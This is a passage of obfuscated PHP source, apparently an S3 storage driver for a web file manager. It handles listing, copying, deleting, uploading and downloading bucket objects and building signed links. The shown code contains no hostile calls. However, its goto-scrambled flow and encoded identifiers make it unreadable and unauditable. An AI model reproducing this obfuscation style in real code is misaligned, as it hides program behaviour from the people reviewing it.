array_to_keyvalue($Bã±öé…, $aßÂ”³õÓ­[33], $aßÂ”³õÓ­[28]); $A¨®š‡ˆÁ = $aßÂ”³õÓ­[95] . get_path_ext($EŒõÇÕ¥¶); $A¨®š‡ˆÁ = $A¨®š‡ˆÁ == $aßÂ”³õÓ­[95] || $c‹ù¦¶´ª– ? $aßÂ”³õÓ­[33] : $A¨®š‡ˆÁ; goto fõª…ó; c”Áâ³¥Î‚: } public function listAllFiles($eïğ¤¿Ï , $Eİ¸¸‚·Ù—, $BÀÑêÍâ = array()) { goto eê…ÇƒÖ†¢; D¬ª¨³µäˆ: $eïğ¤¿Ï  = trim($eïğ¤¿Ï , $a¿Ë„Í‘ÒÈ[8]); foreach ($Eİ¸¸‚·Ù— as $dÖ‘‘Ùª•) { $dàî‚„¾¯ = ltrim(substr(trim($dÖ‘‘Ùª•, $a¿Ë„Í‘ÒÈ[8]), strlen($eïğ¤¿Ï )), $a¿Ë„Í‘ÒÈ[8]); $Bª±»ÀÚ = array_merge($Bª±»ÀÚ, $this->slicePath($dàî‚„¾¯)); } $aÉŞÈåÂÛ² = array(); goto a¬‘ÜÈí—; a¬‘ÜÈí—: foreach (array_unique($Bª±»ÀÚ) as $dÖ‘‘Ùª•) { $e–‡§±¢¶ = array($a¿Ë„Í‘ÒÈ[76] => $this->getPathOuter($a¿Ë„Í‘ÒÈ[8] . $eïğ¤¿Ï  . $a¿Ë„Í‘ÒÈ[8] . $dÖ‘‘Ùª•), $a¿Ë„Í‘ÒÈ[77] => 1, $a¿Ë„Í‘ÒÈ[78] => 0); if (substr($dÖ‘‘Ùª•, -1) != $a¿Ë„Í‘ÒÈ[8]) { $e–‡§±¢¶[$a¿Ë„Í‘ÒÈ[77]] = 0; $dëßÕé™Ú§ = $this->getPath($eïğ¤¿Ï  . $a¿Ë„Í‘ÒÈ[8] . $dÖ‘‘Ùª•); $e–‡§±¢¶[$a¿Ë„Í‘ÒÈ[78]] = isset($BÀÑêÍâ[$dëßÕé™Ú§]) ? $BÀÑêÍâ[$dëßÕé™Ú§] : $this->size($dëßÕé™Ú§); } $aÉŞÈåÂÛ²[] = $e–‡§±¢¶; } return $aÉŞÈåÂÛ²; goto bâÄÎ¹«ˆ¶; eê…ÇƒÖ†¢: $a¿Ë„Í‘ÒÈ =& $_SERVER[úÉ·öƒÑì©]; if (empty($Eİ¸¸‚·Ù—)) { return array(); } $Bª±»ÀÚ = array(); goto D¬ª¨³µäˆ; bâÄÎ¹«ˆ¶: } public function slicePath($f¹¸ˆøöÓ¼) { $Eß¡†ÈŠÔ =& $_SERVER[úÉ·öƒÑì©]; $a§â¬ œë = explode($Eß¡†ÈŠÔ[8], trim($f¹¸ˆøöÓ¼, $Eß¡†ÈŠÔ[8])); $bùÙË…¾«ø = 0; do { ++$bùÙË…¾«ø; $fß‰ğ÷ãîå[] = implode($Eß¡†ÈŠÔ[8], array_slice($a§â¬ œë, 0, $bùÙË…¾«ø)) . $Eß¡†ÈŠÔ[8]; } while ($bùÙË…¾«ø < count($a§â¬ œë)); $fß‰ğ÷ãîå[count($a§â¬ œë) - 1] = $f¹¸ˆøöÓ¼; return $fß‰ğ÷ãîå; } public function getHost() { $Dæ²ìÙ®òÔ =& $_SERVER[úÉ·öƒÑì©]; $EƒÅ£¤Öí‰ = parse_url(trim($this->domain, $Dæ²ìÙ®òÔ[8])); $EÅ‚¶ÑÁó = isset($EƒÅ£¤Öí‰[$Dæ²ìÙ®òÔ[174]]) ? $EƒÅ£¤Öí‰[$Dæ²ìÙ®òÔ[174]] : http_type(); $Fó‡¢½³« = isset($EƒÅ£¤Öí‰[$Dæ²ìÙ®òÔ[175]]) ? $EƒÅ£¤Öí‰[$Dæ²ìÙ®òÔ[175]] : $EƒÅ£¤Öí‰[$Dæ²ìÙ®òÔ[76]]; if (isset($EƒÅ£¤Öí‰[$Dæ²ìÙ®òÔ[176]])) { $Fó‡¢½³« .= $Dæ²ìÙ®òÔ[4] . $EƒÅ£¤Öí‰[$Dæ²ìÙ®òÔ[176]]; } return $EÅ‚¶ÑÁó . $Dæ²ìÙ®òÔ[177] . $Fó‡¢½³«; } public function pathEncode($d—ˆ¸´šàµ) { $E·œÒ‹Ã‡ =& $_SERVER[úÉ·öƒÑì©]; return str_replace($E·œÒ‹Ã‡[178], $E·œÒ‹Ã‡[8], rawurlencode($d—ˆ¸´šàµ)); } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\166\64"; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public function __construct($aîËâõ§Ì) { set_timeout(); require_once SDK_DIR . $_SERVER[úÉ·öƒÑì©][179]; parent::__construct(); $this->_init($aîËâõ§Ì); } public function _init($dœ‰òŠˆ®¤) { foreach ($dœ‰òŠˆ®¤ as $c¡í²½’‘È => $c“À¨×…®ù) { if (isset($this->{$c¡í²½’‘È})) { $this->{$c¡í²½’‘È} = $c“À¨×…®ù; } } $this->endpoint = $dœ‰òŠˆ®¤[$_SERVER[úÉ·öƒÑì©][180]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); } public function signatureVersion($B×Ş—Çá”  = "\166\64") { $this->signVer = $B×Ş—Çá” ; $this->client->setSignatureVersion($B×Ş—Çá” ); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { goto eÚ´”©ÙÈ; eÚ´”©ÙÈ: $e× ìª½Çƒ =& $_SERVER[úÉ·öƒÑì©]; $C±½ÏñĞö¥ = $this->getBucketCors(); if (!$C±½ÏñĞö¥ || !is_array($C±½ÏñĞö¥)) { return !1; } goto cÎ“öì‰³ê; cÎ“öì‰³ê: if ($C±½ÏñĞö¥[$e× ìª½Çƒ[181]] != $e× ìª½Çƒ[182] || $C±½ÏñĞö¥[$e× ìª½Çƒ[183]] != $e× ìª½Çƒ[182]) { return !1; } $cçŒ°éî = array_map($e× ìª½Çƒ[184], $C±½ÏñĞö¥[$e× ìª½Çƒ[185]]); if (!is_array($cçŒ°éî)) { $cçŒ°éî = array(); } goto FÄä¼¼¬Û; FÄä¼¼¬Û: $c÷Æ¦™âõ¶ = array($e× ìª½Çƒ[186], $e× ìª½Çƒ[187], $e× ìª½Çƒ[188], $e× ìª½Çƒ[189], $e× ìª½Çƒ[190]); $f£‚¡È¸¢· = array_diff($c÷Æ¦™âõ¶, $cçŒ°éî); return empty($f£‚¡È¸¢·); goto e¡‹«¥ºÆ; e¡‹«¥ºÆ: } public function mkfile($bÈŠÛ‡áï˜, $c†™£®–ƒã = '', $c£‹·¿éÌñ = REPEAT_RENAME) { $aÖ®ÄÄˆ–¾ = $this->setContent($bÈŠÛ‡áï˜, $c†™£®–ƒã); if ($aÖ®ÄÄˆ–¾ !== !1) { return $this->getPathOuter($bÈŠÛ‡áï˜); } return !1; } public function mkdir($B¥ØÀ¡Ş—, $dÚÃ×ŞíÒ¸ = REPEAT_SKIP) { $C¬ø³„ºÂÈ =& $_SERVER[úÉ·öƒÑì©]; if (empty($B¥ØÀ¡Ş—) && $B¥ØÀ¡Ş— !== $C¬ø³„ºÂÈ[191]) { return !1; } if ($this->_isFolder($B¥ØÀ¡Ş—)) { return $this->getPathOuter($B¥ØÀ¡Ş—); } $EÅ‹×ÌÃ = $this->setContent($B¥ØÀ¡Ş—, $C¬ø³„ºÂÈ[33], !0); if ($EÅ‹×ÌÃ !== !1) { return $this->getPathOuter($B¥ØÀ¡Ş—); } return !1; } public function copyFile($CğºÌŒ‰÷á, $fÚ‡Ÿİ™Ÿ£, $dÍó¾è×¿Ü = array()) { $c˜ˆ‚ó¢ ’ =& $_SERVER[úÉ·öƒÑì©]; $FâÊ÷·ìğ = $this->objectMeta($CğºÌŒ‰÷á); if (!$FâÊ÷·ìğ) { return !1; } if ($FâÊ÷·ìğ[$c˜ˆ‚ó¢ ’[78]] <= 1024 * 1024 * 200) { $fé™İ©¶¦† = $this->client->copyObject($this->bucket, $CğºÌŒ‰÷á, $this->bucket, $fÚ‡Ÿİ™Ÿ£, $c˜ˆ‚ó¢ ’[192], $dÍó¾è×¿Ü); } else { $fé™İ©¶¦† = $this->client->multiCopyObject($this->bucket, $CğºÌŒ‰÷á, $this->bucket, $fÚ‡Ÿİ™Ÿ£, $dÍó¾è×¿Ü); } $fé™İ©¶¦† = $fé™İ©¶¦† ? $this->getPathOuter($fÚ‡Ÿİ™Ÿ£) : !1; return $fé™İ©¶¦†; } public function moveFile($e¯¦»«š¬ù, $D°â÷æ¨) { if ($this->copyFile($e¯¦»«š¬ù, $D°â÷æ¨)) { $this->delFile($e¯¦»«š¬ù); return $this->getPathOuter($D°â÷æ¨); } return !1; } public function delFile($b’£²â ±×) { return $this->client->deleteObject($this->bucket, $b’£²â ±×); } public function delFolder($Eœ¹ãÊ²Ùâ) { goto c—©Õòï‚Ù; e‹£ÔåùÅ‚: $a‹Ö×òÍ® = $this->fileList($Eœ¹ãÊ²Ùâ); $this->listItemCache = !0; $BŒÒ»¨ŸÄ = trim($Eœ¹ãÊ²Ùâ, $Eš‹¹Ç¹ç[8]) . $Eš‹¹Ç¹ç[8]; goto aÖÉ½¬’Ô; dÖ¨Ã¦ÎÑö: $c«Ş—ò­Ò± = $this->delByBatch($a‹Ö×òÍ®[$Eš‹¹Ç¹ç[75]]); if (!$c«Ş—ò­Ò±) { return !1; } return $this->delFile($BŒÒ»¨ŸÄ); goto f¢¢­ÓøÕ‡; c—©Õòï‚Ù: $Eš‹¹Ç¹ç =& $_SERVER[úÉ·öƒÑì©]; if (!$this->exist($Eœ¹ãÊ²Ùâ)) { return !0; } $this->listItemCache = !1; goto e‹£ÔåùÅ‚; aÖÉ½¬’Ô: if (!empty($Eœ¹ãÊ²Ùâ) && $Eœ¹ãÊ²Ùâ !== $Eš‹¹Ç¹ç[191] && !in_array($BŒÒ»¨ŸÄ, $a‹Ö×òÍ®[$Eš‹¹Ç¹ç[75]])) { $a‹Ö×òÍ®[$Eš‹¹Ç¹ç[75]][] = $BŒÒ»¨ŸÄ; } $c«Ş—ò­Ò± = $this->delByBatch($a‹Ö×òÍ®[$Eš‹¹Ç¹ç[74]]); if (!$c«Ş—ò­Ò±) { return !1; } goto dÖ¨Ã¦ÎÑö; f¢¢­ÓøÕ‡: } private function delByBatch($c¶‰ìÀ¬ß) { foreach (array_chunk($c¶‰ìÀ¬ß, 1000) as $fõå¦÷Ñ¶õ) { $cÇéì’ïœ‡ = $this->client->deleteObjects($this->bucket, $fõå¦÷Ñ¶õ); if (!$cÇéì’ïœ‡) { return !1; } } return !0; } public function rename($cªØö˜½¼ğ, $CÍÉç›ë Ò) { return $this->renameObject($cªØö˜½¼ğ, $CÍÉç›ë Ò); } public function listPath($cŠÔù¤˜£–, $CÅ÷©ÅŠ÷Ï = false) { $BÊŠöÂ„¥‰ =& $_SERVER[úÉ·öƒÑì©]; $Cïù…ÊœâÆ = $this->fileList($cŠÔù¤˜£–, $BÊŠöÂ„¥‰[8], !0); foreach ($Cïù…ÊœâÆ[$BÊŠöÂ„¥‰[75]] as $DÔÀ±»½ => $A“¸ø×¹Ş) { $Cïù…ÊœâÆ[$BÊŠöÂ„¥‰[75]][$DÔÀ±»½] = $this->folderInfo($A“¸ø×¹Ş, $CÅ÷©ÅŠ÷Ï); } foreach ($Cïù…ÊœâÆ[$BÊŠöÂ„¥‰[74]] as $DÔÀ±»½ => $A“¸ø×¹Ş) { $Cïù…ÊœâÆ[$BÊŠöÂ„¥‰[74]][$DÔÀ±»½] = $this->fileInfo($A“¸ø×¹Ş[$BÊŠöÂ„¥‰[28]], $CÅ÷©ÅŠ÷Ï, $A“¸ø×¹Ş); } return $Cïù…ÊœâÆ; } private function fileInfo($bˆÒ… õºˆ, $aÚ¶ŞÛíôğ = false, $CöĞ«¾Æº = array()) { goto b“„Ç“”Ñ½; b“„Ç“”Ñ½: $d­‘„ÕùÂÇ =& $_SERVER[úÉ·öƒÑì©]; $DéÕ´“³Á = array($d­‘„ÕùÂÇ[28] => $this->pathThis($bˆÒ… õºˆ), $d­‘„ÕùÂÇ[76] => $this->getPathOuter($bˆÒ… õºˆ), $d­‘„ÕùÂÇ[29] => $d­‘„ÕùÂÇ[193], $d­‘„ÕùÂÇ[168] => $this->ext($bˆÒ… õºˆ), $d­‘„ÕùÂÇ[78] => isset($CöĞ«¾Æº[$d­‘„ÕùÂÇ[78]]) ? $CöĞ«¾Æº[$d­‘„ÕùÂÇ[78]] : 0); if ($aÚ¶ŞÛíôğ) { return $DéÕ´“³Á; } goto bµƒ˜Óíå; bµƒ˜Óíå: $DéÕ´“³Á[$d­‘„ÕùÂÇ[194]] = $DéÕ´“³Á[$d­‘„ÕùÂÇ[84]] = 0; $DéÕ´“³Á[$d­‘„ÕùÂÇ[195]] = $DéÕ´“³Á[$d­‘„ÕùÂÇ[196]] = !0; if (empty($CöĞ«¾Æº)) { $CöĞ«¾Æº = $this->objectMeta($bˆÒ… õºˆ); if (!$CöĞ«¾Æº) { return $DéÕ´“³Á; } } goto dô“Ê‘˜ ; dô“Ê‘˜ : if (isset($CöĞ«¾Æº[$d­‘„ÕùÂÇ[197]])) { $DéÕ´“³Á[$d­‘„ÕùÂÇ[84]] = $CöĞ«¾Æº[$d­‘„ÕùÂÇ[197]]; } if (isset($CöĞ«¾Æº[$d­‘„ÕùÂÇ[78]])) { $DéÕ´“³Á[$d­‘„ÕùÂÇ[78]] = $CöĞ«¾Æº[$d­‘„ÕùÂÇ[78]]; } return $DéÕ´“³Á; goto bê“”„áïç; bê“”„áïç: } private function folderInfo($B‡î´±ÁÒº, $bˆ¶•ŸäÀ = false) { goto F‚çòŒƒ; D‚öÌ• åã: $B‡î´±ÁÒº = trim($B‡î´±ÁÒº, $AšÎ¥Ú„íë[8]) . $AšÎ¥Ú„íë[8]; $B©–‡†¥– = $this->objectMeta($B‡î´±ÁÒº); if (isset($B©–‡†¥–[$AšÎ¥Ú„íë[197]])) { $f…¯ÌÁÌà‹[$AšÎ¥Ú„íë[194]] = $B©–‡†¥–[$AšÎ¥Ú„íë[197]]; } goto B‡Ñøğˆ…±; B‡Ñøğˆ…±: return $f…¯ÌÁÌà‹; goto e‹¨ô Â‡ó; F‚çòŒƒ: $AšÎ¥Ú„íë =& $_SERVER[úÉ·öƒÑì©]; $f…¯ÌÁÌà‹ = array($AšÎ¥Ú„íë[28] => $this->pathThis($B‡î´±ÁÒº), $AšÎ¥Ú„íë[76] => $this->getPathOuter($AšÎ¥Ú„íë[8] . $B‡î´±ÁÒº), $AšÎ¥Ú„íë[29] => $AšÎ¥Ú„íë[77]); if ($bˆ¶•ŸäÀ) { return $f…¯ÌÁÌà‹; } goto Cù©Œ¾÷ƒ; Cù©Œ¾÷ƒ: $f…¯ÌÁÌà‹[$AšÎ¥Ú„íë[194]] = $f…¯ÌÁÌà‹[$AšÎ¥Ú„íë[84]] = 0; $f…¯ÌÁÌà‹[$AšÎ¥Ú„íë[195]] = $f…¯ÌÁÌà‹[$AšÎ¥Ú„íë[196]] = !0; if ($B‡î´±ÁÒº == $AšÎ¥Ú„íë[33]) { return $f…¯ÌÁÌà‹; } goto D‚öÌ• åã; e‹¨ô Â‡ó: } private function fileList($eÓÊĞ „•”, $C£É†×ù» = '', $E‚Òãçî–´ = 0) { goto bóˆÉ¥Û; B‰ñèí¬¦ì: foreach ($DÔ¡¬­§¬‡[$AØ¼íÙİÄ[198]] as $dÜÕ¿îéĞ) { goto cÓ¢“øéšÂ; EåÉœøÔÆˆ: $A½¦¦º¤ª¡[] = $E‚Òãçî–´ ? $dÜÕ¿îéĞ : $dËÓ‡ õùÓ; goto e™ëí¯ç¢; cÓ¢“øéšÂ: $dËÓ‡ õùÓ = $dÜÕ¿îéĞ[$AØ¼íÙİÄ[28]]; if ($dËÓ‡ õùÓ == $f¯Ë£¡»¥) { continue; } $AÎ¥œÓšİ¦ = isset($dÜÕ¿îéĞ[$AØ¼íÙİÄ[78]]) ? $dÜÕ¿îéĞ[$AØ¼íÙİÄ[78]] : 0; goto B×âê‚óÂ; B×âê‚óÂ: $a™“Ÿ‡¥•© = $AÎ¥œÓšİ¦ == 0 && substr($dËÓ‡ õùÓ, strlen($dËÓ‡ õùÓ) - 1, 1) == $AØ¼íÙİÄ[8] ? !0 : !1; if ($EÜ¢¢ïì¨) { $this->cacheMethod($AØ¼íÙİÄ[199], $dËÓ‡ õùÓ, $a™“Ÿ‡¥•©); $this->cacheMethod($AØ¼íÙİÄ[200], $dËÓ‡ õùÓ, $dÜÕ¿îéĞ); } if ($a™“Ÿ‡¥•©) { $eÕ”™ôèÎ¾[] = $dËÓ‡ õùÓ; continue; } goto EåÉœøÔÆˆ; e™ëí¯ç¢: } foreach ($DÔ¡¬­§¬‡[$AØ¼íÙİÄ[201]] as $dÜÕ¿îéĞ) { $eÕ”™ôèÎ¾[] = $dÜÕ¿îéĞ[$AØ¼íÙİÄ[28]]; if ($EÜ¢¢ïì¨) { $this->cacheMethod($AØ¼íÙİÄ[199], $dÜÕ¿îéĞ[$AØ¼íÙİÄ[28]], !0); } } if ($EÜ¢¢ïì¨) { $this->cacheMethod($AØ¼íÙİÄ[199], $eÓÊĞ „•”, !0); } goto EÀÇÒÁÂ«Ô; bóˆÉ¥Û: $AØ¼íÙİÄ =& $_SERVER[úÉ·öƒÑì©]; $f¯Ë£¡»¥ = rtrim($eÓÊĞ „•”, $AØ¼íÙİÄ[8]) . $AØ¼íÙİÄ[8]; $DÔ¡¬­§¬‡ = $this->listObjs($f¯Ë£¡»¥, null, null, $C£É†×ù»); goto a‡ÚçÖ”Š; EÀÇÒÁÂ«Ô: return array($AØ¼íÙİÄ[75] => $eÕ”™ôèÎ¾, $AØ¼íÙİÄ[74] => $A½¦¦º¤ª¡); goto a«Ù†‰¢†; a‡ÚçÖ”Š: if (!$DÔ¡¬­§¬‡) { return array($AØ¼íÙİÄ[75] => array(), $AØ¼íÙİÄ[74] => array()); } $EÜ¢¢ïì¨ = $this->listItemCache === !1 ? !1 : !0; $eÕ”™ôèÎ¾ = $A½¦¦º¤ª¡ = array(); goto B‰ñèí¬¦ì; a«Ù†‰¢†: } private function listObjs($AÉ½ÏÒ™¹Ó, $FŞ‘˜÷»„ = null, $EÉà„¤õ»º = null, $cï„›ñ„â¢ = null) { $cºÌ‚ë¾²Ã =& $_SERVER[úÉ·öƒÑì©]; $AÉ½ÏÒ™¹Ó = trim($AÉ½ÏÒ™¹Ó, $cºÌ‚ë¾²Ã[8]); $F—ä†ØÍ™› = empty($AÉ½ÏÒ™¹Ó) && $AÉ½ÏÒ™¹Ó !== $cºÌ‚ë¾²Ã[191] ? $cºÌ‚ë¾²Ã[33] : $AÉ½ÏÒ™¹Ó . $cºÌ‚ë¾²Ã[8]; return $this->client->getBucket($this->bucket, $F—ä†ØÍ™›, $FŞ‘˜÷»„, $EÉà„¤õ»º, $cï„›ñ„â¢, !0); } public function has($dˆîİä’åã, $CšåÁŒ²öµ = false, $CŒÀÆ³å´¨ = true) { goto F÷ß„ÄÈù¾; d­¶—‡ƒÒô: $DÅØÂŒ… = $f¼×Ñùä¡ = array(); while (!0) { $cåò‚ğ¹œ = $this->listObjs($dˆîİä’åã, $AõˆğµŸçÄ, $bšßê¼„ó, $CĞğ¼¥®¤); if (!$cåò‚ğ¹œ) { break; } $AõˆğµŸçÄ = $cåò‚ğ¹œ[$cËŞä¯’ø[202]]; $dßÂè–â‰“ = $cåò‚ğ¹œ[$cËŞä¯’ø[198]]; $aÈÙø¦ñÏ = $cåò‚ğ¹œ[$cËŞä¯’ø[201]]; if (empty($dßÂè–â‰“) && empty($aÈÙø¦ñÏ)) { break; } if (count($dßÂè–â‰“) == 1 && $dßÂè–â‰“[0][$cËŞä¯’ø[28]] == $Fòå»ƒë«) { break; } if ($CšåÁŒ²öµ) { if (count($dßÂè–â‰“)) { $dßÂè–â‰“ = array_column($dßÂè–â‰“, $cËŞä¯’ø[28]); $DÅØÂŒ… = array_merge($DÅØÂŒ…, $dßÂè–â‰“); } if (count($aÈÙø¦ñÏ)) { $aÈÙø¦ñÏ = array_column($aÈÙø¦ñÏ, $cËŞä¯’ø[28]); $f¼×Ñùä¡ = array_merge($f¼×Ñùä¡, $aÈÙø¦ñÏ); } if ($AõˆğµŸçÄ === null) { break; } continue; } if ($CŒÀÆ³å´¨) { if (!empty($dßÂè–â‰“)) { if (count($dßÂè–â‰“) > 1 || isset($dßÂè–â‰“[0][$cËŞä¯’ø[28]]) && $dßÂè–â‰“[0][$cËŞä¯’ø[28]] != $Fòå»ƒë«) { return !0; } } } else { if (!empty($aÈÙø¦ñÏ)) { return !0; } } if ($AõˆğµŸçÄ === null) { break; } } if ($CšåÁŒ²öµ) { $DÅØÂŒ… = array_diff($DÅØÂŒ…, array($Fòå»ƒë«)); $DÅØÂŒ… = count(array_unique($DÅØÂŒ…)); $f¼×Ñùä¡ = count(array_unique($f¼×Ñùä¡)); return array($cËŞä¯’ø[203] => $DÅØÂŒ…, $cËŞä¯’ø[204] => $f¼×Ñùä¡); } goto dòˆ‡§Úñ°; aè£‹Ò”–É: $AõˆğµŸçÄ = null; $bšßê¼„ó = 500; $CĞğ¼¥®¤ = $cËŞä¯’ø[8]; goto d­¶—‡ƒÒô; dòˆ‡§Úñ°: return !1; goto b½Ä‰Šøã¸; F÷ß„ÄÈù¾: $cËŞä¯’ø =& $_SERVER[úÉ·öƒÑì©]; $dˆîİä’åã = trim($dˆîİä’åã, $cËŞä¯’ø[8]); $Fòå»ƒë« = empty($dˆîİä’åã) && $dˆîİä’åã !== $cËŞä¯’ø[191] ? $cËŞä¯’ø[33] : $dˆîİä’åã . $cËŞä¯’ø[8]; goto aè£‹Ò”–É; b½Ä‰Šøã¸: } public function listAll($eîÄ…ê‡Ç¬) { $aÕŞ¾£¬ì¾ =& $_SERVER[úÉ·öƒÑì©]; $fèÛÔ¥ˆÓ = $this->fileList($eîÄ…ê‡Ç¬, $aÕŞ¾£¬ì¾[33], !0); $F‚æØ±˜‚Û = array(); foreach ($fèÛÔ¥ˆÓ[$aÕŞ¾£¬ì¾[74]] as $E¨ÀÍæ¨®Š) { $F‚æØ±˜‚Û[$E¨ÀÍæ¨®Š[$aÕŞ¾£¬ì¾[28]]] = $E¨ÀÍæ¨®Š[$aÕŞ¾£¬ì¾[78]]; } foreach ($fèÛÔ¥ˆÓ[$aÕŞ¾£¬ì¾[75]] as $E¨ÀÍæ¨®Š) { if (is_string($E¨ÀÍæ¨®Š)) { $F‚æØ±˜‚Û[$E¨ÀÍæ¨®Š] = 0; } } return $this->listAllFiles($eîÄ…ê‡Ç¬, array_keys($F‚æØ±˜‚Û), $F‚æØ±˜‚Û); } public function canRead($cĞæİÌĞ®¿) { $eœ¾µÚÁ¥ =& $_SERVER[úÉ·öƒÑì©]; $dñùãŒºÈ² = $this->client->getAccessControlPolicy($this->bucket, $cĞæİÌĞ®¿); if (!$dñùãŒºÈ²) { return !1; } return in_array($dñùãŒºÈ², array($eœ¾µÚÁ¥[205], $eœ¾µÚÁ¥[206], $eœ¾µÚÁ¥[207])) ? !0 : !1; } public function canWrite($D´ôø£İâí) { $bæ·İì‡§¹ =& $_SERVER[úÉ·öƒÑì©]; $F¤Ö·²Ÿ = $this->client->getAccessControlPolicy($this->bucket, $D´ôø£İâí); if (!$F¤Ö·²Ÿ) { return !1; } return in_array($F¤Ö·²Ÿ, array($bæ·İì‡§¹[205], $bæ·İì‡§¹[206])) ? !0 : !1; } public function getContent($eÇ·Ğà¯„ƒ) { return $this->client->getObject($this->bucket, $eÇ·Ğà¯„ƒ); } public function setContent($B¯°ë½ìÏÃ, $fº¶ğ²‘ = '', $f‚ÎÒšÒ = false) { goto b·Ó©Ä‘ÅË; BßšÍŸ¢å‰: $this->cacheMethod(null, null); $F…Ò¨ÉË‹ = $this->copyFile($B¯°ë½ìÏÃ, $B¯°ë½ìÏÃ, array($C©–—¬ÉŠ™[208] => $F…Ò¨ÉË‹[$C©–—¬ÉŠ™[209]])); return $F…Ò¨ÉË‹ ? !0 : !1; goto CÊˆ¯ß•Ù¬; Eµ»ç“Ëï: $F…Ò¨ÉË‹ = $this->client->putObject($fº¶ğ²‘, $this->bucket, $B¯°ë½ìÏÃ, $C©–—¬ÉŠ™[192], array(), $dĞ”İ“ºó³); if (!$F…Ò¨ÉË‹) { return !1; } if ($f‚ÎÒšÒ) { return !0; } goto BßšÍŸ¢å‰; b·Ó©Ä‘ÅË: $C©–—¬ÉŠ™ =& $_SERVER[úÉ·öƒÑì©]; $B¯°ë½ìÏÃ = $f‚ÎÒšÒ ? trim($B¯°ë½ìÏÃ, $C©–—¬ÉŠ™[8]) . $C©–—¬ÉŠ™[8] : $B¯°ë½ìÏÃ; $dĞ”İ“ºó³ = get_file_mime(get_path_ext($B¯°ë½ìÏÃ)); goto Eµ»ç“Ëï; CÊˆ¯ß•Ù¬: } public function fileSubstr($AéÇÉŒöëå, $cøÚ÷¯¹ê³, $E†Áˆ÷¶Ø) { $Fä‰±Ï·è… = $cøÚ÷¯¹ê³ + $E†Áˆ÷¶Ø - 1; return $this->client->getObject($this->bucket, $AéÇÉŒöëå, array($_SERVER[úÉ·öƒÑì©][210] => "\142\171\164\145\x73\75{$cøÚ÷¯¹ê³}\55{$Fä‰±Ï·è…}")); } public function upload($FÈØ«Ôá“, $Fù§º®Ó“’, $BùÁöôé‰Ÿ = false, $cÏÌÒ ‚›÷ = REPEAT_REPLACE) { $bˆªÆ¶º«Ï =& $_SERVER[úÉ·öƒÑì©]; $aßíßš÷ÙÑ = array($bˆªÆ¶º«Ï[208] => @md5_file($Fù§º®Ó“’)); $A„–ÎƒÉÊ‚ = array($bˆªÆ¶º«Ï[211] => get_file_mime(get_path_ext($FÈØ«Ôá“))); if (IO::size($Fù§º®Ó“’) <= 1024 * 1024 * 200) { $dœã®•ôŸè = $this->client->putObjectFile($Fù§º®Ó“’, $this->bucket, $FÈØ«Ôá“, $bˆªÆ¶º«Ï[192], $aßíßš÷ÙÑ, $A„–ÎƒÉÊ‚); return !empty($dœã®•ôŸè) ? $this->getPathOuter($FÈØ«Ôá“) : !1; } $a­Œ»• = $this->client->multiUploadObject($Fù§º®Ó“’, $this->bucket, trim($FÈØ«Ôá“, $bˆªÆ¶º«Ï[8]), $aßíßš÷ÙÑ, $A„–ÎƒÉÊ‚); return $a­Œ»• ? $this->getPathOuter($FÈØ«Ôá“) : !1; } public function download($aÇ§œÖí«, $Fğª‘ƒòÈö) { if (!@is_dir($this->pathFather($Fğª‘ƒòÈö)) && !IO::mkdir($this->pathFather($Fğª‘ƒòÈö))) { return !1; } $bØµéì‡í¦ = $this->client->getObject($this->bucket, $aÇ§œÖí«, array(), $Fğª‘ƒòÈö); return $bØµéì‡í¦ !== !1 ? $Fğª‘ƒòÈö : !1; } public function link($AÒ‰ÕÀÛ¤¹, $aÀÍè¢»Á¹ = array()) { $bãéğê÷Öß =& $_SERVER[úÉ·öƒÑì©]; if ($this->signVer == $bãéğê÷Öß[212]) { return $this->client->getAuthenticatedURL($this->bucket, $AÒ‰ÕÀÛ¤¹, 3600 * 12, $aÀÍè¢»Á¹); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($AÒ‰ÕÀÛ¤¹, $bãéğê÷Öß[8]), 3600 * 12, $this->region, array(), !0, $aÀÍè¢»Á¹); } public function fileOut($EÅ§¦°ÒÕ, $F‘¨õ’‹• = false, $B¦Ï‰»ËÔ = false, $C¤‡‰Ì•¨ = '') { goto a¯ç‘ì¬ø ; a¯ç‘ì¬ø : $Fñ½´ô†›Á =& $_SERVER[úÉ·öƒÑì©]; if ($this->isFileOutServer()) { return $this->fileOutServer($EÅ§¦°ÒÕ, $F‘¨õ’‹•, $B¦Ï‰»ËÔ, $C¤‡‰Ì•¨); } if (!$B¦Ï‰»ËÔ) { $B¦Ï‰»ËÔ = $this->pathThis($EÅ§¦°ÒÕ); } goto d³ÏêÌïÍ; d³ÏêÌïÍ: $fÑ±½­ô¦ = get_file_mime(get_path_ext($B¦Ï‰»ËÔ)); if ($fÑ±½­ô¦ == $Fñ½´ô†›Á[213]) { return parent::fileOut($EÅ§¦°ÒÕ, $F‘¨õ’‹•, $B¦Ï‰»ËÔ, $C¤‡‰Ì•¨); } $F‘¨õ’‹• = $F‘¨õ’‹• ? $Fñ½´ô†›Á[214] : $Fñ½´ô†›Á[215]; goto d””İŒøø‹; d””İŒøø‹: $dŞâ¥¯Áğ‚ = array($Fñ½´ô†›Á[216] => $F‘¨õ’‹• . $Fñ½´ô†›Á[217] . rawurlencode($B¦Ï‰»ËÔ), $Fñ½´ô†›Á[218] => $fÑ±½­ô¦); $CææÚ…ÕÄ = $this->link($EÅ§¦°ÒÕ, $dŞâ¥¯Áğ‚); $this->fileOutLink($CææÚ…ÕÄ); goto D¯Š¶ˆö‚‡; D¯Š¶ˆö‚‡: } public function fileOutServer($b¨ÈÃĞÕ, $B„å’ÜÀ¿± = false, $e·ƒ“ìË±ˆ = false, $Cİ­¢õÇÈ˜ = '') { parent::fileOut($b¨ÈÃĞÕ, $B„å’ÜÀ¿±, $e·ƒ“ìË±ˆ, $Cİ­¢õÇÈ˜); } public function fileOutImageServer($EŒ¢Ğ¨‹†İ, $A‡ŸçÒˆÓ = 250) { parent::fileOutImage($EŒ¢Ğ¨‹†İ, $A‡ŸçÒˆÓ); } public function hashMd5($E©ôŠÀÓ¾, $d¦…ƒöÖ„Œ = '') { $eğ¶ã¸¢øØ =& 